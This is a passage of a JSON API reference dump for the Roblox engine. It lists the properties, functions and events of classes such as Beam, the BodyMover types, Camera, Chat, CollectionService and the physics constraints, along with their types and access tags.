aceCamera","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"Beam"},{"ValueType":"int","type":"Property","Name":"Segments","tags":[],"Class":"Beam"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"TextureLength","tags":[],"Class":"Beam"},{"ValueType":"TextureMode","type":"Property","Name":"TextureMode","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"TextureSpeed","tags":[],"Class":"Beam"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"Width0","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"Width1","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"Beam"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Arguments":[{"Name":"value","Type":"BinaryString"}],"Name":"Changed","tags":[],"Class":"BinaryStringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[{"Type":"Objects","Name":"ignoreList","Default":null}],"Name":"GetLargestCutoffDistance","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Array","Name":"castPoints","Default":null},{"Type":"Objects","Name":"ignoreList","Default":null}],"Name":"GetPartsObscuringTarget","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["LocalUserSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Redo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetWaypoints","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"state","Default":null}],"Name":"SetEnabled","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"SetWaypoint","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Undo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CharacterAppearance","tags":[]},{"Superclass":"CharacterAppearance","type":"Class","Name":"BodyColors","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"HeadColor","tags":[],"Class":"BodyColors"},{"ValueType":"Color3","type":"Property","Name":"HeadColor3","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"Color3","type":"Property","Name":"LeftArmColor3","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"Color3","type":"Property","Name":"LeftLegColor3","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"Color3","type":"Property","Name":"RightArmColor3","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"Color3","type":"Property","Name":"RightLegColor3","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"TorsoColor","tags":[],"Class":"BodyColors"},{"ValueType":"Color3","type":"Property","Name":"TorsoColor3","tags":[],"Class":"BodyColors"},{"Superclass":"CharacterAppearance","type":"Class","Name":"CharacterMesh","tags":[]},{"ValueType":"int","type":"Property","Name":"BaseTextureId","tags":[],"Class":"CharacterMesh"},{"ValueType":"BodyPart","type":"Property","Name":"BodyPart","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"MeshId","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"OverlayTextureId","tags":[],"Class":"CharacterMesh"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Clothing","tags":[]},{"Superclass":"Clothing","type":"Class","Name":"Pants","tags":[]},{"ValueType":"Content","type":"Property","Name":"PantsTemplate","tags":[],"Class":"Pants"},{"Superclass":"Clothing","type":"Class","Name":"Shirt","tags":[]},{"ValueType":"Content","type":"Property","Name":"ShirtTemplate","tags":[],"Class":"Shirt"},{"Superclass":"CharacterAppearance","type":"Class","Name":"ShirtGraphic","tags":[]},{"ValueType":"Content","type":"Property","Name":"Graphic","tags":[],"Class":"ShirtGraphic"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Skin","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"SkinColor","tags":[],"Class":"Skin"},{"Superclass":"Instance","type":"Class","Name":"Chat","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"LoadDefaultChat","tags":["ScriptWriteRestricted: [NotAccessibleSecurity]"],"Class":"Chat"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"Chat","tags":[],"Class":"Chat","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"ChatLocal","tags":["RobloxScriptSecurity"],"Class":"Chat","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetShouldUseLuaChat","tags":["RobloxScriptSecurity"],"Class":"Chat","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CanUserChatAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userIdFrom","Default":null},{"Type":"int","Name":"userIdTo","Default":null}],"Name":"CanUsersChatAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null},{"Type":"Instance","Name":"playerTo","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null}],"Name":"FilterStringForBroadcast","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerToFilterFor","Default":null}],"Name":"FilterStringForPlayerAsync","tags":["deprecated"],"Class":"Chat","type":"YieldFunction"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"color","Type":"ChatColor"}],"Name":"Chatted","tags":[],"Class":"Chat","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ClickDetector","tags":[]},{"ValueType":"Content","type":"Property","Name":"CursorIcon","tags":[],"Class":"ClickDetector"},{"ValueType":"float","type":"Property","Name":"MaxActivationDistance","tags":[],"Class":"ClickDetector"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"MouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverEnter","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverLeave","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"RightMouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"mouseClick","tags":["deprecated"],"Class":"ClickDetector","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CollectionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null},{"Type":"string","Name":"tag","Default":null}],"Name":"AddTag","tags":[],"Class":"CollectionService","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"class","Default":null}],"Name":"GetCollection","tags":["deprecated"],"Class":"CollectionService","type":"Function"},{"ReturnType":"EventInstance","Arguments":[{"Type":"string","Name":"tag","Default":null}],"Name":"GetInstanceAddedSignal","tags":[],"Class":"CollectionService","type":"Function"},{"ReturnType":"EventInstance","Arguments":[{"Type":"string","Name":"tag","Default":null}],"Name":"GetInstanceRemovedSignal","tags":[],"Class":"CollectionService","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"tag","Default":null}],"Name":"GetTagged","tags":[],"Class":"CollectionService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"GetTags","tags":[],"Class":"CollectionService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"instance","Default":null},{"Type":"string","Name":"tag","Default":null}],"Name":"HasTag","tags":[],"Class":"CollectionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null},{"Type":"string","Name":"tag","Default":null}],"Name":"RemoveTag","tags":[],"Class":"CollectionService","type":"Function"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemAdded","tags":["deprecated"],"Class":"CollectionService","type":"Event"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemRemoved","tags":["deprecated"],"Class":"CollectionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Color3Value","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Value","tags":[],"Class":"Color3Value"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"Changed","tags":[],"Class":"Color3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"changed","tags":["deprecated"],"Class":"Color3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Configuration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Constraint","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Constraint"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Constraint"},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"Constraint"},{"Superclass":"Constraint","type":"Class","Name":"AlignOrientation","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxAngularVelocity","tags":[],"Class":"AlignOrientation"},{"ValueType":"float","type":"Property","Name":"MaxTorque","tags":[],"Class":"AlignOrientation"},{"ValueType":"bool","type":"Property","Name":"PrimaryAxisOnly","tags":[],"Class":"AlignOrientation"},{"ValueType":"bool","type":"Property","Name":"ReactionTorqueEnabled","tags":[],"Class":"AlignOrientation"},{"ValueType":"float","type":"Property","Name":"Responsiveness","tags":[],"Class":"AlignOrientation"},{"ValueType":"bool","type":"Property","Name":"RigidityEnabled","tags":[],"Class":"AlignOrientation"},{"Superclass":"Constraint","type":"Class","Name":"AlignPosition","tags":[]},{"ValueType":"bool","type":"Property","Name":"ApplyAtCenterOfMass","tags":[],"Class":"AlignPosition"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"AlignPosition"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"AlignPosition"},{"ValueType":"bool","type":"Property","Name":"ReactionForceEnabled","tags":[],"Class":"AlignPosition"},{"ValueType":"float","type":"Property","Name":"Responsiveness","tags":[],"Class":"AlignPosition"},{"ValueType":"bool","type":"Property","Name":"RigidityEnabled","tags":[],"Class":"AlignPosition"},{"Superclass":"Constraint","type":"Class","Name":"BallSocketConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"bool","type":"Property","Name":"TwistLimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"TwistLowerAngle","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"TwistUpperAngle","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"BallSocketConstraint"},{"Superclass":"Constraint","type":"Class","Name":"HingeConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"HingeConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"HingeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"LineForce","tags":[]},{"ValueType":"bool","type":"Property","Name":"ApplyAtCenterOfMass","tags":[],"Class":"LineForce"},{"ValueType":"bool","type":"Property","Name":"InverseSquareLaw","tags":[],"Class":"LineForce"},{"ValueType":"float","type":"Property","Name":"Magnitude","tags":[],"Class":"LineForce"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"LineForce"},{"ValueType":"bool","type":"Property","Name":"ReactionForceEnabled","tags":[],"Class":"LineForce"},{"Superclass":"Constraint","type":"Class","Name":"RodConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"RodConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RopeConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"RopeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"SlidingBallConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentPosition","tags":["readonly"],"Class":"SlidingBallConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"LowerLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Speed","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"TargetPosition","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"UpperLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"SlidingBallConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"CylindricalConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"AngularActuatorType","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"bool","type":"Property","Name":"AngularLimitsEnabled","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"AngularRestitution","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"InclinationAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAngularAcceleration","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"bool","type":"Property","Name":"RotationAxisVisible","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotationAxis","tags":["readonly"],"